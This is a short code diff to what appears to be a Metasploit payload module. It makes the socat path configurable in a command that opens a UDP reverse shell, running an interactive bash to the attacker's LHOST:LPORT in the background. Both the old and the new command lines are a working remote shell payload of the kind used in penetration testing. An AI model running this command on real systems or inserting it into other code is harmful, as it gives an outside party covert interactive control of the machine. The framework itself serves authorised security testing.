@@ -29,6 +29,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('SOCAT_PATH', [true ,'The path to Socat', 'socat'])
+    ])
   end
 
   #
@@ -43,7 +46,7 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "socat udp-connect:#{datastore['LHOST']}:#{datastore['LPORT']} exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"
+    "#{datastore['SOCAT_PATH']} udp-connect:#{datastore['LHOST']}:#{datastore['LPORT']} exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"
   end
 
 end
